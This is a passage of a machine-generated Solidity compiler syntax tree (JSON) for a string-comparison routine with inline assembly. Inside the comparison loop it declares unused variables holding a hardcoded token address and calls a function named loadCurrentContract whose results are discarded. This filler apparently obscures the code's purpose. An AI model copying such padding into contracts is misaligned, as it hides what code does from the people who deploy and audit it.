																"src": "1332:44:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_5270116ddce6ea9bbc0c25fe85461affe258517d80c431366a2308e1e2ce7379",
																	"typeString": "literal_string \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\""
																},
																"value": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "1294:82:0"
														},
														{
															"assignments": [
																81
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 81,
																	"mutability": "mutable",
																	"name": "TOKEN_CONTRACT_ADDRESS",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 158,
																	"src": "1391:36:0",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 80,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "1391:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 83,
															"initialValue": {
																"argumentTypes": null,
																"hexValue": "307863303261616133396232323366653864306130653563346632376561643930383363373536636332",
																"id": 82,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1430:44:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_5270116ddce6ea9bbc0c25fe85461affe258517d80c431366a2308e1e2ce7379",
																	"typeString": "literal_string \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\""
																},
																"value": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "1391:83:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 85,
																		"name": "WETH_CONTRACT_ADDRESS",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 77,
																		"src": "1509:21:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 84,
																	"name": "loadCurrentContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 313,
																	"src": "1489:19:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory) pure returns (string memory)"
																	}
																},
																"id": 86,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1489:42:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"id": 87,
															"nodeType": "ExpressionStatement",
															"src": "1489:42:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 89,
																		"name": "TOKEN_CONTRACT_ADDRESS",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 81,
																		"src": "1566:22:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 88,
																	"name": "loadCurrentContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 313,
																	"src": "1546:19:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory) pure returns (string memory)"
																	}
																},
																"id": 90,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1546:43:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"id": 91,
															"nodeType": "ExpressionStatement",
															"src": "1546:43:0"
														},
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "1613:91:0",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "1632:19:0",
																		"value": {
																			"arguments": [
																				{
																					"name": "selfptr",
																					"nodeType": "YulIdentifier",
																					"src": "1643:7:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "1637:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1637:14:0"
																		},
																		"variableNames": [
																			{
																				"name": "a",
																				"nodeType": "YulIdentifier",
																				"src": "1632:1:0"
																			}
																		]
																	},
																	{
																		"nodeType": "YulAssignment",
																		"src": "1669:20:0",
																		"value": {
																			"arguments": [
																				{
																					"name": "otherptr",
																					"nodeType": "YulIdentifier",
																					"src": "1680:8:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "1674:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1674:15:0"
																		},
																		"variableNames": [
																			{
																				"name": "b",
																				"nodeType": "YulIdentifier",
																				"src": "1669:1:0"
																			}
																		]
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 71,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1632:1:0",
																	"valueSize": 1
																},
																{
																	"declaration": 74,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1669:1:0",
																	"valueSize": 1
																},
																{
																	"declaration": 55,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1680:8:0",
																	"valueSize": 1
																},
																{
																	"declaration": 50,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1643:7:0",
																	"valueSize": 1
																}
															],
															"id": 92,
															"nodeType": "InlineAssembly",
															"src": "1604:100:0"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 95,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 93,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 71,
																	"src": "1724:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 94,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 74,
																	"src": "1729:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "1724:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 149,
															"nodeType": "IfStatement",
															"src": "1720:410:0",
															"trueBody": {
																"id": 148,
																"nodeType": "Block",
																"src": "1732:398:0",
																"statements": [
																	{
																		"assignments": [
																			97
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 97,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 148,
																				"src": "1835:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 96,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "1835:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 103,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 101,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "-",
																					"prefix": true,
																					"src": "1858:2:0",
																					"subExpression": {
																						"argumentTypes": null,
																						"hexValue": "31",
																						"id": 100,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "1859:1:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_1_by_1",
																							"typeString": "int_const 1"
																						},
																						"value": "1"
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_minus_1_by_1",
																						"typeString": "int_const -1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_minus_1_by_1",
																						"typeString": "int_const -1"
																					}
																				],
																				"id": 99,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "1850:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint256_$",
																					"typeString": "type(uint256)"
																				},
																				"typeName": {
																					"id": 98,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "1850:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 102,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "1850:11:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "1835:26:0"
																	},
																	{
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 106,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 104,
																				"name": "shortest",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 34,
																				"src": "1885:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3332",
																				"id": 105,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "1896:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_32_by_1",
																					"typeString": "int_const 32"
																				},
																				"value": "32"
																			},
																			"src": "1885:13:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": null,
																		"id": 126,
																		"nodeType": "IfStatement",
																		"src": "1882:105:0",
																		"trueBody": {
																			"id": 125,
																			"nodeType": "Block",
																			"src": "1900:87:0",
																			"statements": [
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 123,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 107,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 97,
																							"src": "1921:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"id": 122,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"nodeType": "UnaryOperation",
																							"operator": "~",
																							"prefix": true,
																							"src": "1928:39:0",
																							"subExpression": {
																								"argumentTypes": null,
																								"components": [
																									{
																										"argumentTypes": null,
																										"commonType": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										},
																										"id": 120,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"leftExpression": {
																											"argumentTypes": null,
																											"commonType": {
																												"typeIdentifier": "t_uint256",
																												"typeString": "uint256"
																											},
																											"id": 118,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": false,
																											"lValueRequested": false,
																											"leftExpression": {
																												"argumentTypes": null,
																												"hexValue": "32",
																												"id": 108,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": true,
																												"kind": "number",
																												"lValueRequested": false,
																												"nodeType": "Literal",
																												"src": "1930:1:0",
																												"subdenomination": null,
																												"typeDescriptions": {
																													"typeIdentifier": "t_rational_2_by_1",
																													"typeString": "int_const 2"
																												},
																												"value": "2"
																											},
																											"nodeType": "BinaryOperation",
																											"operator": "**",
																											"rightExpression": {
																												"argumentTypes": null,
																												"components": [
																													{
																														"argumentTypes": null,
																														"commonType": {
																															"typeIdentifier": "t_uint256",
																															"typeString": "uint256"
																														},
																														"id": 116,
																														"isConstant": false,
																														"isLValue": false,
																														"isPure": false,
																														"lValueRequested": false,
																														"leftExpression": {
																															"argumentTypes": null,
																															"hexValue": "38",
																															"id": 109,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": true,
																															"kind": "number",
																															"lValueRequested": false,
																															"nodeType": "Literal",
																															"src": "1936:1:0",
																															"subdenomination": null,
																															"typeDescriptions": {
																																"typeIdentifier": "t_rational_8_by_1",
																																"typeString": "int_const 8"
																															},
																															"value": "8"
																														},
																														"nodeType": "BinaryOperation",
																														"operator": "*",
																														"rightExpression": {
																															"argumentTypes": null,
																															"components": [
																																{
																																	"argumentTypes": null,
																																	"commonType": {
																																		"typeIdentifier": "t_uint256",
																																		"typeString": "uint256"
																																	},
																																	"id": 114,
																																	"isConstant": false,
																																	"isLValue": false,
																																	"isPure": false,
																																	"lValueRequested": false,
																																	"leftExpression": {
																																		"argumentTypes": null,
																																		"commonType": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		},
																																		"id": 112,
																																		"isConstant": false,
																																		"isLValue": false,
																																		"isPure": false,
																																		"lValueRequested": false,
																																		"leftExpression": {
																																			"argumentTypes": null,
																																			"hexValue": "3332",
																																			"id": 110,
																																			"isConstant": false,
																																			"isLValue": false,
																																			"isPure": true,
																																			"kind": "number",
																																			"lValueRequested": false,
																																			"nodeType": "Literal",
																																			"src": "1941:2:0",
																																			"subdenomination": null,
																																			"typeDescriptions": {
																																				"typeIdentifier": "t_rational_32_by_1",
																																				"typeString": "int_const 32"
																																			},
																																			"value": "32"
																																		},
																																		"nodeType": "BinaryOperation",
																																		"operator": "-",
																																		"rightExpression": {
																																			"argumentTypes": null,
																																			"id": 111,
																																			"name": "shortest",
																																			"nodeType": "Identifier",
																																			"overloadedDeclarations": [],
																																			"referencedDeclaration": 34,
																																			"src": "1946:8:0",
																																			"typeDescriptions": {
																																				"typeIdentifier": "t_uint256",
																																				"typeString": "uint256"
																																			}
																																		},
																																		"src": "1941:13:0",
																																		"typeDescriptions": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		}
																																	},
																																	"nodeType": "BinaryOperation",
																																	"operator": "+",
																																	"rightExpression": {
																																		"argumentTypes": null,
																																		"id": 113,
																																		"name": "idx",
																																		"nodeType": "Identifier",
																																		"overloadedDeclarations": [],
																																		"referencedDeclaration": 60,
																																		"src": "1957:3:0",
																																		"typeDescriptions": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		}
																																	},
																																	"src": "1941:19:0",
																																	"typeDescriptions": {
																																		"typeIdentifier": "t_uint256",
																																		"typeString": "uint256"
																																	}
																																}
																															],
																															"id": 115,
																															"isConstant": false,
																															"isInlineArray": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"nodeType": "TupleExpression",
																															"src": "1940:21:0",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														},
																														"src": "1936:25:0",
																														"typeDescriptions": {
																															"typeIdentifier": "t_uint256",
																															"typeString": "uint256"
																														}
																													}
																												],
																												"id": 117,
																												"isConstant": false,
																												"isInlineArray": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"nodeType": "TupleExpression",
																												"src": "1935:27:0",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											},
																											"src": "1930:32:0",
																											"typeDescriptions": {
																												"typeIdentifier": "t_uint256",
																												"typeString": "uint256"
																											}
																										},
																										"nodeType": "BinaryOperation",
																										"operator": "-",
																										"rightExpression": {
																											"argumentTypes": null,
																											"hexValue": "31",
																											"id": 119,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": true,
																											"kind": "number",
																											"lValueRequested": false,
																											"nodeType": "Literal",
																											"src": "1965:1:0",
																											"subdenomination": null,
																											"typeDescriptions": {
																												"typeIdentifier": "t_rational_1_by_1",
																												"typeString": "int_const 1"
																											},
																											"value": "1"
																										},
																										"src": "1930:36:0",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									}
																								],
																								"id": 121,
																								"isConstant": false,
																								"isInlineArray": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"nodeType": "TupleExpression",
																								"src": "1929:38:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "1921:46:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 124,
																					"nodeType": "ExpressionStatement",
																					"src": "1921:46:0"
																				}
																			]
																		}
																	},
																	{
																		"assignments": [
																			128
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 128,
																				"mutability": "mutable",
																				"name": "diff",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 148,
																				"src": "2005:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 127,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "2005:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 138,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 137,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"components": [
																					{
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 131,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 129,
																							"name": "a",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 71,
																							"src": "2021:1:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "&",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 130,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 97,
																							"src": "2025:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "2021:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"id": 132,
																				"isConstant": false,
																				"isInlineArray": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "TupleExpression",
																				"src": "2020:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"components": [
																					{
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 135,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 133,
																							"name": "b",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 74,
																							"src": "2034:1:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "&",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 134,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 97,
																							"src": "2038:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "2034:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"id": 136,
																				"isConstant": false,
																				"isInlineArray": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "TupleExpression",
																				"src": "2033:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "2020:23:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2005:38:0"
																	},
																	{
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 141,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 139,
																				"name": "diff",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 128,
																				"src": "2066:4:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 140,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "2074:1:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			},
																			"src": "2066:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": null,
																		"id": 147,
																		"nodeType": "IfStatement",
																		"src": "2062:52:0",
																		"trueBody": {
																			"expression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 144,
																						"name": "diff",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 128,
																						"src": "2109:4:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"id": 143,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "2105:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_int256_$",
																						"typeString": "type(int256)"
																					},
																					"typeName": {
																						"id": 142,
																						"name": "int",
																						"nodeType": "ElementaryTypeName",
																						"src": "2105:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": null,
																							"typeString": null
																						}
																					}
																				},
																				"id": 145,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "2105:9:0",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_int256",
																					"typeString": "int256"
																				}
																			},
																			"functionReturnParameters": 32,
																			"id": 146,
																			"nodeType": "Return",
																			"src": "2098:16:0"
																		}
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 152,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 150,
																	"name": "selfptr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 50,
																	"src": "2144:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 151,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2155:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2144:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 153,
															"nodeType": "ExpressionStatement",
															"src": "2144:13:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 156,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 154,
																	"name": "otherptr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 55,
																	"src": "2172:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 155,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2184:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2172:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 157,
															"nodeType": "ExpressionStatement",
															"src": "2172:14:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 65,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 63,
														"name": "idx",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 60,
														"src": "1167:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 64,
														"name": "shortest",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 34,
														"src": "1173:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1167:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 159,
												"initializationExpression": {
													"assignments": [
														60
													],
													"declarations": [
														{
															"constant": false,
															"id": 60,
															"mutability": "mutable",
															"name": "idx",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 159,
															"src": "1153:8:0",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 59,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "1153:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 62,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 61,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1164:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "1153:12:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 68,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 66,
															"name": "idx",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
